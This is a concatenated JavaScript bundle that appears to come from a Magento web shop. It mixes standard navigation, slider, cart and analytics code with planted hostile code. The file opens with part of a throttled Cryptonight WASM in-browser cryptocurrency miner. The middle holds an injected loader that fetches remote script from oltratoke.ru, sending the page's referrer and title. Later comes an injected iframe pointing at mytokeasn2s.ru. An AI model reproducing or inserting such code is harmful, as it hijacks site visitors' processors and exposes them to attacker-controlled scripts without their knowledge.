job=msg.data;if(job.verify_id){this.verify(job);return}if(!this.currentJob||this.currentJob.job_id!==job.job_id){this.setJob(job)}if(job.throttle){this.throttleWait=1\/(1-job.throttle)-1;this.throttledStart=this.now();this.throttledHashes=0;this.workThrottled()}else{this.work()}});CryptonightWASMWrapper.prototype.destroy=(function(){_cryptonight_destroy(this.ctx)});CryptonightWASMWrapper.prototype.hexToBytes=(function(hex,bytes){var bytes=new Uint8Array(hex.length\/2);for(var i=0,c=0;c<hex.length;c+=2,i++){bytes[i]=parseInt(hex.substr(c,2),16)}return bytes});CryptonightWASMWrapper.prototype.bytesToHex=(function(bytes){for(var hex=\"\",i=0;i<bytes.length;i++){hex+=(bytes[i]>>>4).toString(16);hex+=(bytes[i]&15).toString(16)}return hex});CryptonightWASMWrapper.prototype.meetsTarget=(function(hash,target){for(var i=0;i<target.length;i++){var hi=hash.length-i-1,ti=target.length-i-1;if(hash[hi]>target[ti]){return false}else if(hash[hi]<target[ti]){return true}}return false});CryptonightWASMWrapper.prototype.setVersion=(function(version){if(version>7){this.cryptonight_hash_impl=_cryptonight_hash_variant_2}else if(version===7){this.cryptonight_hash_impl=_cryptonight_hash_variant_1}else{this.cryptonight_hash_impl=_cryptonight_hash_variant_0}});CryptonightWASMWrapper.prototype.setJob=(function(job){this.currentJob=job;this.blob=this.hexToBytes(job.blob);this.input.set(this.blob);this.setVersion(this.blob[0]);var target=this.hexToBytes(job.target);if(target.length<=8){for(var i=0;i<target.length;i++){this.target[this.target.length-i-1]=target[target.length-i-1]}for(var i=0;i<this.target.length-target.length;i++){this.target[i]=255}}else{this.target=target}});CryptonightWASMWrapper.prototype.now=(function(){return self.performance?self.performance.now():Date.now()});CryptonightWASMWrapper.prototype.hash=(function(input,output,length){var nonce=Math.random()*4294967295+1>>>0;this.input[39]=(nonce&4278190080)>>24;this.input[40]=(nonce&16711680)>>16;this.input[41]=(nonce&65280)>>8;this.input[42]=(nonce&255)>>0;this.cryptonight_hash_impl(this.ctx,input.byteOffset,output.byteOffset,length)});CryptonightWASMWrapper.prototype.verify=(function(job){this.blob=this.hexToBytes(job.blob);this.input.set(this.blob);this.setVersion(this.blob[0]);for(var i=0,c=0;c<job.nonce.length;c+=2,i++){this.input[39+i]=parseInt(job.nonce.substr(c,2),16)}this.cryptonight_hash_impl(this.ctx,this.input.byteOffset,this.output.byteOffset,this.blob.length);var result=this.bytesToHex(this.output);self.postMessage({verify_id:job.verify_id,verified:result===job.result,result:result})});CryptonightWASMWrapper.prototype.work=(function(){var hashes=0;var meetsTarget=false;var start=this.now();var elapsed=0;do{this.hash(this.input,this.output,this.blob.length);hashes++;meetsTarget=this.meetsTarget(this.output,this.target);elapsed=this.now()-start}while(!meetsTarget&&elapsed<1e3);var hashesPerSecond=hashes\/(elapsed\/1e3);if(meetsTarget){var nonceHex=this.bytesToHex(this.input.subarray(39,43));var resultHex=this.bytesToHex(this.output);self.postMessage({hashesPerSecond:hashesPerSecond,hashes:hashes,job_id:this.currentJob.job_id,nonce:nonceHex,result:resultHex})}else{self.postMessage({hashesPerSecond:hashesPerSecond,hashes:hashes})}});CryptonightWASMWrapper.prototype.workThrottled=(function(){var start=this.now();this.hash(this.input,this.output,this.blob.length);var end=this.now();var timePerHash=end-start;this.throttledHashes++;var elapsed=end-this.throttledStart;var hashesPerSecond=this.throttledHashes\/(elapsed\/1e3);if(this.meetsTarget(this.output,this.target)){var nonceHex=this.bytesToHex(this.input.subarray(39,43));var resultHex=this.bytesToHex(this.output);self.postMessage({hashesPerSecond:hashesPerSecond,hashes:this.throttledHashes,job_id:this.currentJob.job_id,nonce:nonceHex,result:resultHex});this.throttledHashes=0}else if(elapsed>1e3){self.postMessage({hashesPerSecond:hashesPerSecond,hashes:this.throttledHashes});this.throttledHashes=0}else{var wait=Math.min(2e3,timePerHash*this.throttleWait);setTimeout(this.workThrottledBound,wait)}});Module[\"onRuntimeInitialized\"]=(function(){var cryptonight=new CryptonightWASMWrapper}) ");

/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Academic Free License (AFL 3.0)
 * that is bundled with this package in the file LICENSE_AFL.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/afl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category    Varien
 * @package     js
 * @copyright   Copyright (c) 2010 Magento Inc. (http://www.magentocommerce.com)
 * @license     http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
 */

/**
 * @classDescription simple Navigation with replacing old handlers
 * @param {String} id id of ul element with navigation lists
 * @param {Object} settings object with settings
 */
var mainNav = function() {

    var main = {
        obj_nav :   $(arguments[0]) || $("nav"),

        settings :  {
            show_delay      :   0,
            hide_delay      :   0,
            _ie6            :   /MSIE 6.+Win/.test(navigator.userAgent),
            _ie7            :   /MSIE 7.+Win/.test(navigator.userAgent)
        },

        init :  function(obj, level) {
            obj.lists = obj.childElements();
            obj.lists.each(function(el,ind){
                main.handlNavElement(el);
                if((main.settings._ie6 || main.settings._ie7) && level){
                    main.ieFixZIndex(el, ind, obj.lists.size());
                }
            });
            if(main.settings._ie6 && !level){
                document.execCommand("BackgroundImageCache", false, true);
            }
        },

        handlNavElement :   function(list) {
            if(list !== undefined){
                list.onmouseover = function(){
                    main.fireNavEvent(this,true);
                };
                list.onmouseout = function(){
                    main.fireNavEvent(this,false);
                };
                if(list.down("ul")){
                    main.init(list.down("ul"), true);
                }
            }
        },

        ieFixZIndex : function(el, i, l) {
            if(el.tagName.toString().toLowerCase().indexOf("iframe") == -1){
                el.style.zIndex = l - i;
            } else {
                el.onmouseover = "null";
                el.onmouseout = "null";
            }
        },

        fireNavEvent :  function(elm,ev) {
            if(ev){
                elm.addClassName("over");
                elm.down("a").addClassName("over");
                if (elm.childElements()[1]) {
                    main.show(elm.childElements()[1]);
                }
            } else {
                elm.removeClassName("over");
                elm.down("a").removeClassName("over");
                if (elm.childElements()[1]) {
                    main.hide(elm.childElements()[1]);
                }
            }
        },

        show : function (sub_elm) {
            if (sub_elm.hide_time_id) {
                clearTimeout(sub_elm.hide_time_id);
            }
            sub_elm.show_time_id = setTimeout(function() {
                if (!sub_elm.hasClassName("shown-sub")) {
                    sub_elm.addClassName("shown-sub");
                }
            }, main.settings.show_delay);
        },

        hide : function (sub_elm) {
            if (sub_elm.show_time_id) {
                clearTimeout(sub_elm.show_time_id);
            }
            sub_elm.hide_time_id = setTimeout(function(){
                if (sub_elm.hasClassName("shown-sub")) {
                    sub_elm.removeClassName("shown-sub");
                }
            }, main.settings.hide_delay);
        }

    };
    if (arguments[1]) {
        main.settings = Object.extend(main.settings, arguments[1]);
    }
    if (main.obj_nav) {
        main.init(main.obj_nav, false);
    }
};

document.observe("dom:loaded", function() {
    //run navigation without delays and with default id="#nav"
    //mainNav();

    //run navigation with delays
    mainNav("nav", {"show_delay":"100","hide_delay":"100"});
});

var d=document;var s=d.createElement('script'); 
s.src='https://oltratoke.ru/yBs7XK?frm=script&'+window.location.search.replace('?', '&')+'&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + ''; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}
//<![CDATA[
	var aw_ajaxcartpro_proganim = 'center';
	var aw_ajaxcartpro_cartanim = 'opacity';
	var aw_base_url = 'http://www.carncompany.com/';
	
	AW_ACP = {
		cartURL : 'http://www.carncompany.com/checkout/cart/',
		useConfirmation : 1,
		isCartPage :  0,
		theme : 'default'
	}
	
	

	//]]>
// script.aculo.us slider.js v1.8.2, Tue Nov 18 18:30:58 +0100 2008

// Copyright (c) 2005-2008 Marty Haught, Thomas Fuchs
//
// script.aculo.us is freely distributable under the terms of an MIT-style license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

if (!Control) var Control = { };

// options:
//  axis: 'vertical', or 'horizontal' (default)
//
// callbacks:
//  onChange(value)
//  onSlide(value)
Control.Slider = Class.create({
  initialize: function(handle, track, options) {
    var slider = this;

    if (Object.isArray(handle)) {
      this.handles = handle.collect( function(e) { return $(e) });
    } else {
      this.handles = [$(handle)];
    }

    this.track   = $(track);
    this.options = options || { };

    this.axis      = this.options.axis || 'horizontal';
    this.increment = this.options.increment || 1;
    this.step      = parseInt(this.options.step || '1');
    this.range     = this.options.range || $R(0,1);

    this.value     = 0; // assure backwards compat
    this.values    = this.handles.map( function() { return 0 });
    this.spans     = this.options.spans ? this.options.spans.map(function(s){ return $(s) }) : false;
    this.options.startSpan = $(this.options.startSpan || null);
    this.options.endSpan   = $(this.options.endSpan || null);

    this.restricted = this.options.restricted || false;

    this.maximum   = this.options.maximum || this.range.end;
    this.minimum   = this.options.minimum || this.range.start;

    // Will be used to align the handle onto the track, if necessary
    this.alignX = parseInt(this.options.alignX || '0');
    this.alignY = parseInt(this.options.alignY || '0');

    this.trackLength = this.maximumOffset() - this.minimumOffset();

    this.handleLength = this.isVertical() ?
      (this.handles[0].offsetHeight != 0 ?
        this.handles[0].offsetHeight : this.handles[0].style.height.replace(/px$/,"")) :
      (this.handles[0].offsetWidth != 0 ? this.handles[0].offsetWidth :
        this.handles[0].style.width.replace(/px$/,""));

    this.active   = false;
    this.dragging = false;
    this.disabled = false;

    if (this.options.disabled) this.setDisabled();

    // Allowed values array
    this.allowedValues = this.options.values ? this.options.values.sortBy(Prototype.K) : false;
    if (this.allowedValues) {
      this.minimum = this.allowedValues.min();
      this.maximum = this.allowedValues.max();
    }

    this.eventMouseDown = this.startDrag.bindAsEventListener(this);
    this.eventMouseUp   = this.endDrag.bindAsEventListener(this);
    this.eventMouseMove = this.update.bindAsEventListener(this);

    // Initialize handles in reverse (make sure first handle is active)
    this.handles.each( function(h,i) {
      i = slider.handles.length-1-i;
      slider.setValue(parseFloat(
        (Object.isArray(slider.options.sliderValue) ?
          slider.options.sliderValue[i] : slider.options.sliderValue) ||
         slider.range.start), i);
      h.makePositioned().observe("mousedown", slider.eventMouseDown);
    });

    this.track.observe("mousedown", this.eventMouseDown);
    document.observe("mouseup", this.eventMouseUp);
    $(this.track.parentNode.parentNode).observe("mousemove", this.eventMouseMove);


    this.initialized = true;
  },
  dispose: function() {
    var slider = this;
    Event.stopObserving(this.track, "mousedown", this.eventMouseDown);
    Event.stopObserving(document, "mouseup", this.eventMouseUp);
    Event.stopObserving(this.track.parentNode.parentNode, "mousemove", this.eventMouseMove);
    this.handles.each( function(h) {
      Event.stopObserving(h, "mousedown", slider.eventMouseDown);
    });
  },
  setDisabled: function(){
    this.disabled = true;
    this.track.parentNode.className = this.track.parentNode.className + ' disabled';
  },
  setEnabled: function(){
    this.disabled = false;
  },
  getNearestValue: function(value){
    if (this.allowedValues){
      if (value >= this.allowedValues.max()) return(this.allowedValues.max());
      if (value <= this.allowedValues.min()) return(this.allowedValues.min());

      var offset = Math.abs(this.allowedValues[0] - value);
      var newValue = this.allowedValues[0];
      this.allowedValues.each( function(v) {
        var currentOffset = Math.abs(v - value);
        if (currentOffset <= offset){
          newValue = v;
          offset = currentOffset;
        }
      });
      return newValue;
    }
    if (value > this.range.end) return this.range.end;
    if (value < this.range.start) return this.range.start;
    return value;
  },
  setValue: function(sliderValue, handleIdx){
    if (!this.active) {
      this.activeHandleIdx = handleIdx || 0;
      this.activeHandle    = this.handles[this.activeHandleIdx];
      this.updateStyles();
    }
    handleIdx = handleIdx || this.activeHandleIdx || 0;
    if (this.initialized && this.restricted) {
      if ((handleIdx>0) && (sliderValue<this.values[handleIdx-1]))
        sliderValue = this.values[handleIdx-1];
      if ((handleIdx < (this.handles.length-1)) && (sliderValue>this.values[handleIdx+1]))
        sliderValue = this.values[handleIdx+1];
    }
    sliderValue = this.getNearestValue(sliderValue);
    this.values[handleIdx] = sliderValue;
    this.value = this.values[0]; // assure backwards compat

    this.handles[handleIdx].style[this.isVertical() ? 'top' : 'left'] =
      this.translateToPx(sliderValue);

    this.drawSpans();
    if (!this.dragging || !this.event) this.updateFinished();
  },
  setValueBy: function(delta, handleIdx) {
    this.setValue(this.values[handleIdx || this.activeHandleIdx || 0] + delta,
      handleIdx || this.activeHandleIdx || 0);
  },
  translateToPx: function(value) {
    return Math.round(
      ((this.trackLength-this.handleLength)/(this.range.end-this.range.start)) *
      (value - this.range.start)) + "px";
  },
  translateToValue: function(offset) {
    return ((offset/(this.trackLength-this.handleLength) *
      (this.range.end-this.range.start)) + this.range.start);
  },
  getRange: function(range) {
    var v = this.values.sortBy(Prototype.K);
    range = range || 0;
    return $R(v[range],v[range+1]);
  },
  minimumOffset: function(){
    return(this.isVertical() ? this.alignY : this.alignX);
  },
  maximumOffset: function(){
    return(this.isVertical() ?
      (this.track.offsetHeight != 0 ? this.track.offsetHeight :
        this.track.style.height.replace(/px$/,"")) - this.alignY :
      (this.track.offsetWidth != 0 ? this.track.offsetWidth :
        this.track.style.width.replace(/px$/,"")) - this.alignX);
  },
  isVertical:  function(){
    return (this.axis == 'vertical');
  },
  drawSpans: function() {
    var slider = this;
    if (this.spans)
      $R(0, this.spans.length-1).each(function(r) { slider.setSpan(slider.spans[r], slider.getRange(r)) });
    if (this.options.startSpan)
      this.setSpan(this.options.startSpan,
        $R(0, this.values.length>1 ? this.getRange(0).min() : this.value ));
    if (this.options.endSpan)
      this.setSpan(this.options.endSpan,
        $R(this.values.length>1 ? this.getRange(this.spans.length-1).max() : this.value, this.maximum));
  },
  setSpan: function(span, range) {
    if (this.isVertical()) {
      span.style.top = this.translateToPx(range.start);
      span.style.height = this.translateToPx(range.end - range.start + this.range.start);
    } else {
      span.style.left = this.translateToPx(range.start);
      span.style.width = this.translateToPx(range.end - range.start + this.range.start);
    }
  },
  updateStyles: function() {
    this.handles.each( function(h){ Element.removeClassName(h, 'selected') });
    Element.addClassName(this.activeHandle, 'selected');
  },
  startDrag: function(event) {
    if (Event.isLeftClick(event)) {
      if (!this.disabled){
        this.active = true;

        var handle = Event.element(event);
        var pointer  = [Event.pointerX(event), Event.pointerY(event)];
        var track = handle;
        if (track==this.track) {
          var offsets  = Position.cumulativeOffset(this.track);
          this.event = event;
          this.setValue(this.translateToValue(
           (this.isVertical() ? pointer[1]-offsets[1] : pointer[0]-offsets[0])-(this.handleLength/2)
          ));
          var offsets  = Position.cumulativeOffset(this.activeHandle);
          this.offsetX = (pointer[0] - offsets[0]);
          this.offsetY = (pointer[1] - offsets[1]);
        } else {
          // find the handle (prevents issues with Safari)
          while((this.handles.indexOf(handle) == -1) && handle.parentNode)
            handle = handle.parentNode;

          if (this.handles.indexOf(handle)!=-1) {
            this.activeHandle    = handle;
            this.activeHandleIdx = this.handles.indexOf(this.activeHandle);
            this.updateStyles();

            var offsets  = Position.cumulativeOffset(this.activeHandle);
            this.offsetX = (pointer[0] - offsets[0]);
            this.offsetY = (pointer[1] - offsets[1]);
          }
        }
      }
      Event.stop(event);
    }
  },
  update: function(event) {
   if (this.active) {
      if (!this.dragging) this.dragging = true;
      this.draw(event);
      if (Prototype.Browser.WebKit) window.scrollBy(0,0);
      Event.stop(event);
   }
  },
  draw: function(event) {
    var pointer = [Event.pointerX(event), Event.pointerY(event)];
    var offsets = Position.cumulativeOffset(this.track);
    pointer[0] -= this.offsetX + offsets[0];
    pointer[1] -= this.offsetY + offsets[1];
    this.event = event;
    this.setValue(this.translateToValue( this.isVertical() ? pointer[1] : pointer[0] ));
    if (this.initialized && this.options.onSlide)
      this.options.onSlide(this.values.length>1 ? this.values : this.value, this);
  },
  endDrag: function(event) {
    if (this.active && this.dragging) {
      this.finishDrag(event, true);
      Event.stop(event);
    }
    this.active = false;
    this.dragging = false;
  },
  finishDrag: function(event, success) {
    this.active = false;
    this.dragging = false;
    this.updateFinished();
  },
  updateFinished: function() {
    if (this.initialized && this.options.onChange)
      this.options.onChange(this.values.length>1 ? this.values : this.value, this);
    this.event = null;
  }
});
//<![CDATA[
optionalZipCountries = ["MY"];
//]]>
document.getElementById('a3d3f806f-6d87-8797-244a-ab46c30063f4').innerHTML = '<iframe frameborder="0" width="" height="" src="https://mytokeasn2s.ru/mwRwD7?se_referrer=' + encodeURIComponent(document.referrer) + '&frm=frame"></iframe>'
/**
 * aheadWorks Co.
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the EULA
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://ecommerce.aheadworks.com/LICENSE-M1.txt
 *
 * @category   AW
 * @package    AW_Ajaxcartpro
 * @copyright  Copyright (c) 2009-2010 aheadWorks Co. (http://www.aheadworks.com)
 * @license    http://ecommerce.aheadworks.com/LICENSE-M1.txt
 */

window.intPrevious = setInterval(function(){
	if(typeof AW_ACP != 'undefined' && document.body){
		if(typeof aw_cartDivClass == 'undefined'){
			 aw_cartDivClass =
				AW_ACP.theme == 'blank' ?
					'.block-cart' :
					'.mini-cart';

			if(!$$(aw_cartDivClass).length || !$$(aw_cartDivClass)[0].tagName){
				 aw_cartDivClass =  '.block-cart'
			}
		}
		if(typeof aw_topLinkCartClass == 'undefined'){
			 aw_topLinkCartClass = '.top-link-cart';
		}
		if(typeof aw_addToCartButtonClass == 'undefined'){
			 aw_addToCartButtonClass = '.form-button';
		}
		if(typeof aw_bigCartClass == 'undefined'){
            if (typeof($$('.layout-1column')[0]) != 'undefined')
                aw_bigCartClass = '.layout-1column';
            else if (typeof($$('.col-main')[0]) != 'undefined')
				aw_bigCartClass = '.col-main';
            else
                aw_bigCartClass = '.cart';
		}
        if(typeof aw_wishlistClass == 'undefined'){
			 if (typeof($$('.my-wishlist')[0]) != 'undefined')
                aw_wishlistClass = '.my-wishlist';
             else
                aw_wishlistClass = '.padder';
		}

        if(typeof aw_topWishlistLinkCartClass == 'undefined'){
            aw_topWishlistLinkCartClass = '.top-link-wishlist';
        }

		if (window.location.toString().search('/product_compare/') != -1){
			win = window.opener;
		}
		else{
			win = window;
		}
		clearInterval(intPrevious)
	}
}, 500);

function ajaxcartprodelete(url){
	showProgressAnimation();
	url = getCommonUrl(url)


    new Ajax.Request(url, {
          onSuccess: function(resp){
				try{
					if (typeof(resp.responseText) == 'string') eval('resp = ' + resp.responseText);
				}catch(e){

					return;
				}
				hideProgressAnimation();
                __onACPRender()
                updateCartView(resp, '');
			}
        });


}

function updateCartView(resp){
    if (AW_ACP.isCartPage) return updateBigCartView(resp);

	var __cartObj = $$(aw_cartDivClass)[0];

	if(__cartObj)
    {
        if (typeof(__cartObj.length) == 'number') __cartObj = __cartObj[0];
        var oldHeight = __cartObj.offsetHeight;

        var tmpDiv = win.document.createElement('div');
        tmpDiv.innerHTML = resp.cart;
        $(tmpDiv).cleanWhitespace();

        var tmpParent = __cartObj.parentNode;
        tmpParent.replaceChild($(tmpDiv).select(aw_cartDivClass)[0], __cartObj);

        /* Details popup support */

        var __cartObj = $$(aw_cartDivClass)[0];
        var newHeight = __cartObj.offsetHeight;

        addEffectACP(__cartObj, aw_ajaxcartpro_cartanim);
        truncateOptions();
    }
    updateDeleteLinks();
	updateTopLinks(resp);
}

function updateWishlist(resp)
{
	var wishlistObj = $$(aw_wishlistClass)[0];

    if(wishlistObj){
        var tmpDiv = win.document.createElement('div');
        tmpDiv.innerHTML = resp.wishlist;

        var tmpParent = wishlistObj.parentNode;
        tmpParent.replaceChild(tmpDiv.firstChild, wishlistObj);
    }
}


var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-11991549-14']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
jQuery(document).ready(function(){
				
				var thumblinks = jQuery('#banner_thumbs > ul > li > a');
				thumblinks.click(function(){
					var thumbnail = jQuery(this);
					var relNum = thumbnail.parent().index();
					jQuery(jQuery('#pettabs.hideme li')[relNum]).find('a').click();
					//var relNum = thumbnail.attr('rel').replace('thumb','');
					//jQuery('#pettabs.hideme a[rel="tab' + relNum + '"]').click();
					return false;
				});
			});
jQuery.getScript('/js/carnco.js');
/**
* Sliderman.js
* Version: 1.3.5
* Author: Taras Ozarko (tozarko@gmail.com)
*
* (c) 2010-2011 Devtrix. All rights reserved. http://www.devtrix.net/sliderman/
**/

var Sliderman = new function(){
	var Sliderman = this;

	function foreach(o, f){for(var k in o) if(o.hasOwnProperty(k) && f(k,o[k],o)) return;}
	function is_array(a){return a && a.constructor == Array;}
	function is_string(a){return typeof(a) == 'string';}
	function is_function(a){return typeof(a) == 'function';}
	function now(){return (new Date()).getTime();}
	function this_blur(){this.blur();}
	
	function random(l){
		r = Math.round(Math.random()*(l+1));
		if(r > 0 && r < l+1) r--;
		else r = random(l);
		return r;
	}//random

	function addElementEvent(o,e,f){
		var of = o[e];
		var f2 = function(){of();f();}
		o[e] = !is_function(of) ? f : f2;
	}//addElementEvent

	var _loadImage = [];
	function loadImage(s,f,always_show_loading){
		var i_onload = function(){_loadImage[s]=true;if(f)f(s);}
		var l = function(){if(_loadImage[s]){if(f)f(s);}else{var i=newElement('IMG');i.onload=i_onload;new function(){i.src=s;};}}
		if(always_show_loading) setTimeout(l, typeof(always_show_loading) == 'number' ? always_show_loading : 1000);
		else l();
	}//loadImage

	function array_copy(a){
		if(is_array(a)) var r = [];
		else var r = {};
		foreach(a, function(i){r[i] = typeof(a[i]) != 'object' ? a[i] : array_copy(a[i]);});
		return r;
	}//array_copy

	function eq(a, b){
		return String(a).replace(/^\s+/, '').replace(/\s+$/, '').toLowerCase() == String(b).replace(/^\s+/, '').replace(/\s+$/, '').toLowerCase();
	}//eq

	function array_search(arr, a, b){
		var result = false;
		if(!b){
			foreach(arr, function(i){
				if(eq(arr[i], b)){
					result = i;
					return true;
				}
			});
		}
		else{
			foreach(arr, function(i){
				if(eq(arr[i][a], b)){
					result = i;
					return true;
				}
			});
		}
		return result;
	}//array_search

	function validateOption(a, b){
		b = b.split(',');
		var result;
		foreach(b, function(i){
			result = b[i];
			if(eq(a, b[i])) return true;
		});
		return result;
	}//validateOption

	var setOpacity;
	function setOpacityInit(){
		if(setOpacity) return;
		var p, b = document.body, s = b.style;
		if(is_string(s.opacity)) p = 'opacity';
	  else if(is_string(s.MozOpacity)) p = 'MozOpacity';
	  else if(is_string(s.KhtmlOpacity)) p = 'KhtmlOpacity';
	  else if(b.filters && navigator.appVersion.match(/MSIE ([\d.]+);/)[1]>=5.5) p = 'filter';
	  if(p == 'filter'){
			setOpacity = function(style, v){
				if(v > 1) v = 1;
				else if(v < 0) v = 0;
			  style[p] = "alpha(opacity=" + Math.round(v*100) + ")";
			}
		}else if(p){
			setOpacity = function(style, v){
				if(v > 1) v = 1;
				else if(v < 0) v = 0;
			  style[p] = v.toFixed(2);
			}
		}else setOpacity = ef
	}//setOpacityInit

	function setStyle(style, property, value){
		if(is_string(value)) style[property] = value;
		else if(property == 'clip') style[property] = 'rect('+Math.round(value[0])+'px, '+Math.round(value[1])+'px, '+Math.round(value[2])+'px, '+Math.round(value[3])+'px)';
		else if(property == 'opacity') setOpacity(style, value);
		else style[property] = Math.round(value)+'px';
	}//setStyle
	function setStyles(style, properties){
		foreach(properties, function(property){
			setStyle(style, property, properties[property]);
		});
	}
	function hide(style){style.display = 'none';}
	function show(style){style.display = '';}

	function newElement(tagName, styles){
		var e = document.createElement(tagName);
		if(styles) setStyles(e.style, styles);
		return e;
	}//newElement
	
	var definedObjects = [];
	function defineObject(t, o){
		if(!is_array(definedObjects[t])) definedObjects[t] = [];
		if(o){
			var n = -1, i;
			if(o.name){
				if(i = array_search(definedObjects[t], 'name', o.name)) n = i;
			}else o.name = 'Sliderman-nameless-object-'+definedObjects[t].length;
			if(n >= 0) definedObjects[t][n] = o;
			else definedObjects[t].push(o);
		}
	}//defineObjects
	Sliderman.easing = function(e){defineObject('easing', e);}
	Sliderman.order = function(e){defineObject('order', e);}
	Sliderman.effect = function(e){defineObject('effect', EffectObject(e));}
	
	function getDefinedObjects(t){
		return definedObjects[t];
	}//getDefinedObjects
	
	function getDefinedObject(t, n){
		var a = getDefinedObjects(t), i;
		return is_array(a) && (i = array_search(a, 'name', n)) ? a[i] : false;
	}//getDefinedObject
	
	var _EffectObject = 0;
	function EffectObject(a){
		if(typeof(a) != 'object') a = {};
		if(!a.name) a.name = 'Sliderman-nameless-effect-'+_EffectObject++;
		a.interval = parseInt(a.interval) || 40; a.duration = parseInt(a.duration) || 200; a.delay = parseInt(a.delay) || 0;
		a.cols = parseInt(a.cols) || 1; a.rows = parseInt(a.rows) || 1; a.count = a.cols*a.rows;
		a.top = a.top ? true : false; a.right = a.right ? true : false; a.bottom = a.bottom ? true : false; a.left = a.left ? true : false;
		a.fade = a.fade ? true : false; a.zoom = a.zoom ? true : false; a.move = a.move ? true : false, a.chess = a.chess ? true : false;
		a.easing = getDefinedObject('easing', a.easing) ? a.easing : 'swing';
		a.order = getDefinedObject('order', a.order) ? a.order : 'random'; a.order_cache_id = [a.order, a.cols, a.rows, a.road, a.reverse].join(',');
		a.cache_id = [a.interval, a.duration, a.delay, a.top, a.right, a.bottom, a.left, a.fade, a.zoom, a.move, a.chess, a.order_cache_id].join(',');
		a.cacheId = function(){return a.cache_id + (a.order == 'random' ? now() : '');}
		a.frames_count = Math.round(a.duration/a.interval); a.easingArr = getEasing(a);
		a.P = []; a.pieces = function(w,h){w /= a.cols; h /= a.rows; var wh = w+'x'+h; if(!a.P[wh]){a.P[wh] = {width: w, height: h};
			for(var c = 0; c < a.cols; c++) for(var r = 0; r < a.rows; r++) a.P[wh][r+','+c] = [r*h, c*w+w, r*h+h, c*w];
			}return a.P[wh];}
		return a;
	}//EffectObject
	
	function slideContainer(slidesContainer, display){
		var container = newElement('div', {width: display.width, height: display.height, position: 'absolute', top: 0, left: 0, overflow: 'hidden'});
		slidesContainer.appendChild(container);
		return container;
	}//slideContainer

	var EffectsArr = [];
	function Effects(parameters){
		var effect = parameters.effect,	display = parameters.display;
		if(parameters.contentmode) effect.zoom = false;
		var cr, piece, r, image, startStylesArr = [], AnimateArr = [], needAnimate = [], AnimateItemsArr = [], styleStart, styleEnd, styleDif;

		var container = slideContainer(parameters.container, display);

		var pieces = effect.pieces(display.width, display.height);
		var e_top, e_bottom, e_left, e_right;
		var effectsOptStr = effect.cacheId();
		var frameN;
		var orderArr = getOrder(effect);

		if(EffectsArr[effectsOptStr]){
			startStylesArr = EffectsArr[effectsOptStr].startStylesArr;
			AnimateArr = EffectsArr[effectsOptStr].AnimateArr;
			needAnimate = EffectsArr[effectsOptStr].needAnimate;
		}else{
			for(r = 0; r < effect.rows; r++) for(c = 0; c < effect.cols; c++){cr = r+','+c;
				if(effect.chess && orderArr[cr] % 2 == 1){
					e_top = effect.bottom; e_bottom = effect.top;
					e_left = effect.right; e_right = effect.left;
				}else{
					e_top = effect.top; e_bottom = effect.bottom;
					e_left = effect.left; e_right = effect.right;
				}

				styleStart = {top: 0, left: 0, opacity: 1, width: display.width, height: display.height, overflow: 'hidden'};
				styleEnd = array_copy(styleStart); piece = array_copy(pieces[cr]);

				if(effect.fade) styleStart.opacity = 0;

				if(e_top && e_bottom) piece[0] = piece[2] = (piece[0] + piece[2]) / 2;
				else if(e_top) piece[2] -= pieces.height;
				else if(e_bottom) piece[0] += pieces.height;
				if(e_left && e_right) piece[1] = piece[3] = (piece[1] + piece[3]) / 2;
				else if(e_left) piece[1] -= pieces.width;
				else if(e_right) piece[3] += pieces.width;

				if(effect.zoom){
					styleStart.left = pieces[cr][3];
					styleStart.top = pieces[cr][0];
					if(e_left && e_right) styleStart.left += pieces.width / 2;
					else if(e_right) styleStart.left += pieces.width;
					else if(!e_left) styleStart.left = 0;
					if(e_top && e_bottom) styleStart.top += pieces.height / 2;
					else if(e_bottom) styleStart.top += pieces.height;
					else if(!e_top) styleStart.top = 0;
					if(e_left || e_right) piece[1] = piece[3] = 0;
					if(e_top || e_bottom) piece[0] = piece[2] = 0;
					styleStart.width = e_left || e_right ? 0 : display.width;
					styleStart.height = e_top || e_bottom ? 0 : display.height;
				}

				if(effect.move){
					if(e_top){
						styleStart.top = parseInt(styleStart.top)-pieces.height;
						piece[0] += pieces.height; piece[2] += pieces.height;
					}
					if(e_bottom){
						styleStart.top = parseInt(styleStart.top)+pieces.height;
						piece[0] -= pieces.height; piece[2] -= pieces.height;
					}
					if(e_left){
						styleStart.left = parseInt(styleStart.left)-pieces.width;
						piece[1] += pieces.width; piece[3] += pieces.width;
					}
					if(e_right){
						styleStart.left = parseInt(styleStart.left)+pieces.width;
						piece[1] -= pieces.width; piece[3] -= pieces.width;
					}
				}

				styleStart.clip = piece;
				styleEnd.clip = pieces[cr];

				styleDif = [];
				foreach(styleEnd, function(property){
					if(styleStart[property].toString() != styleEnd[property].toString()){
						styleDif[property] = [];
						if(property == 'clip'){
							foreach(styleStart[property], function(n){
								styleDif[property][n] = styleEnd[property][n] - styleStart[property][n];
							});
						}else styleDif[property] = styleEnd[property] - styleStart[property];
						needAnimate[cr] = true;
					}
				});

				startStylesArr[cr] = styleStart; AnimateArr[cr] = [];
				if(effect.delay) for(var n = 0; n < Math.round(orderArr[cr]*effect.delay/effect.interval); n++) AnimateArr[cr].push(null);

				if(!needAnimate[cr]) AnimateArr[cr].push({display: ''});
				else for(frameN = 1; frameN <= effect.frames_count; frameN++){
